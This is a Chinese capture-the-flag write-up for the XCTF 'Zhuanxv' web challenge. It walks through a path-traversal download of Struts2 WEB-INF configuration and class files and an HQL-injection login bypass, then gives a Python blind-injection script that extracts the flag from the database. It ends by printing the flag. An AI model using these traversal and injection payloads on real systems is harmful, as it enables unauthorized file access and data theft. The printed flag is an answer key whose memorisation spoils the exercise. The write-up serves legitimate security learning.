# Zhuanxv

[题目地址](https://adworld.xctf.org.cn/challenges/details?hash=ab3e7454-5dc0-4157-8c3d-d77e5e1b7de0_2)

好阴间的web题。

进入网站，只有一个页面不断更新显示当前时间。源代码也没东西。这个时候一般就是看robots.txt或者直接目录爆破。爆破后得到/list路径。

- http://61.147.171.105:62006/list

提示请登录。登录咱就熟悉了，很有可能和sql注入有关。万能密码什么的肯定不行，看看源代码有没有提示sql语句之类的。提示没找到，倒是发现了奇怪的url。

```html
body{
    background:url(./loadimage?fileName=web_login_bg.jpg) no-repeat center;
    background-size: cover;
}
```

这种用get传参传个文件名还藏这么深的10个有8个有文件包含漏洞。从cookie为JSESSIONID猜测为java网页项目，那看看网站的配置文件总不会错。web项目的资源一般放在/src/main/resources/static下，配置文件则在/src/main/webapp/WEB_INF下。从上面的加载方式发现我们当前在static目录中，那么找WEB_INF就是../../webapp/WEB_INF/web.xml（配置文件一般叫web.xml)。但是没找到，原来是直接../../WEB_INF/web.xml就行了(看[wp](https://blog.csdn.net/l8947943/article/details/122372989)不要只看一半啊）。

- http://61.147.171.105:62006/loadimage?fileName=../../WEB-INF/web.xml

下载下来后缀为jpg。不慌，打开看看。

```xml
<?xml version="1.0" encoding="UTF-8"?>
<web-app id="WebApp_9" version="2.4"
         xmlns="http://java.sun.com/xml/ns/j2ee"
         xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
         xsi:schemaLocation="http://java.sun.com/xml/ns/j2ee http://java.sun.com/xml/ns/j2ee/web-app_2_4.xsd">
    <display-name>Struts Blank</display-name>
    <filter>
        <filter-name>struts2</filter-name>
        <filter-class>org.apache.struts2.dispatcher.ng.filter.StrutsPrepareAndExecuteFilter</filter-class>
    </filter>
    <filter-mapping>
        <filter-name>struts2</filter-name>
        <url-pattern>/*</url-pattern>
    </filter-mapping>
    <welcome-file-list>
        <welcome-file>/ctfpage/index.jsp</welcome-file>
    </welcome-file-list>
    <error-page>
        <error-code>404</error-code>
        <location>/ctfpage/404.html</location>
    </error-page>
</web-app>
```

struts2是什么框架我不懂，不过struts2的核心配置文件是struts.xml。该文件主要负责管理应用中的Action映射，以及该Action包含的Result定义等。这么重要的东西不能不看。

```xml
<?xml version="1.0" encoding="UTF-8"?>

<!DOCTYPE struts PUBLIC
        "-//Apache Software Foundation//DTD Struts Configuration 2.3//EN"
        "http://struts.apache.org/dtds/struts-2.3.dtd">
<struts>
	<constant name="strutsenableDynamicMethodInvocation" value="false"/>
    <constant name="struts.mapper.alwaysSelectFullNamespace" value="true" />
    <constant name="struts.action.extension" value=","/>
    <package name="front" namespace="/" extends="struts-default">
        <global-exception-mappings>
            <exception-mapping exception="java.lang.Exception" result="error"/>
        </global-exception-mappings>
        <action name="zhuanxvlogin" class="com.cuitctf.action.UserLoginAction" method="execute">
            <result name="error">/ctfpage/login.jsp</result>
            <result name="success">/ctfpage/welcome.jsp</result>
        </action>
        <action name="loadimage" class="com.cuitctf.action.DownloadAction">
            <result name="success" type="stream">
                <param name="contentType">image/jpeg</param>
                <param name="contentDisposition">attachment;filename="bg.jpg"</param>
                <param name="inputName">downloadFile</param>
            </result>
            <result name="suffix_error">/ctfpage/welcome.jsp</result>
        </action>
    </package>
    <package name="back" namespace="/" extends="struts-default">
        <interceptors>
            <interceptor name="oa" class="com.cuitctf.util.UserOAuth"/>
            <interceptor-stack name="userAuth">
                <interceptor-ref name="defaultStack" />
                <interceptor-ref name="oa" />
            </interceptor-stack>

        </interceptors>
        <action name="list" class="com.cuitctf.action.AdminAction" method="execute">
            <interceptor-ref name="userAuth">
                <param name="excludeMethods">
                    execute
                </param>
            </interceptor-ref>
            <result name="login_error">/ctfpage/login.jsp</result>
            <result name="list_error">/ctfpage/welcome.jsp</result>
            <result name="success">/ctfpage/welcome.jsp</result>
        </action>
    </package>
</struts>
```

每个action标签内的class字段内容就是我们要找的映射文件。全部看一遍。

- http://61.147.171.105:62006/loadimage?fileName=../../WEB-INF/classes/com/cuitctf/action/UserLoginAction.class<br>http://61.147.171.105:62006/loadimage?fileName=../../WEB-INF/classes/com/cuitctf/action/DownloadAction.class<br>http://61.147.171.105:62006/loadimage?fileName=../../WEB-INF/classes/com/cuitctf/util/UserOAuth.class<br>http://61.147.171.105:62006/loadimage?fileName=../../WEB-INF/classes/com/cuitctf/action/AdminAction.class

这些文件名都是有规律的。它们都在WEB-INF/classes文件夹下，毕竟都是class。剩下的路径就看class字段的内容了。下载下来后记得修改文件名称为.class，然后在vscode中找个decompiler插件进行反编译。UserLoginAction.class中引用了几个包，都用上面的方法下载下来看看。从user.hbm.xml得知表名和类名映射；从com/cuitctf/service/impl/UserServiceImpl.class得知过滤规则，用户名只过滤空格和等号，密码限制只能字母+数字；从com/cuitctf/dao/impl/UserDaoImpl.class得知hql语句，变量拼接导致hql注入。

[hql注入](https://www.sec-in.com/article/144)又是什么玩意？从名字就知道和sql注入很像，但是比sql鸡肋多了，功能非常少。看wp吧，得到注入url。

- http://61.147.171.105:62006/zhuanxvlogin?user.name=admin%27%0Aor%0A%271%27%3E%270%27%0Aor%0Aname%0Alike%0A%27admin&user.password=1

然而进来了也没用，flag在数据库里，登录的页面就是个好看的空壳。最后爆flag。

```python
import requests
s=requests.session()

FLAG=''
for i in range(1,50):
    p=''
    for j in range(1,255):
        payload="(select%0Aascii(substr(id,"+str(i)+",1))%0Afrom%0AFlag%0Awhere%0Aid<2)<'"+str(j)+"'"
        #print payload
        url="http://61.147.171.105:62006/zhuanxvlogin?user.name=admin'%0Aor%0A"+payload+"%0Aor%0Aname%0Alike%0A'admin&user.password=1"
        r1=s.get(url)
        #print url
        #print len(r1.text)
        if len(r1.text)>20000 and p!='':
            FLAG+=p
            print i,FLAG
            break
        p=chr(j)
```

这篇摆大烂。

- ### Flag
  > sctf{C46E250926A2DFFD831975396222B08E}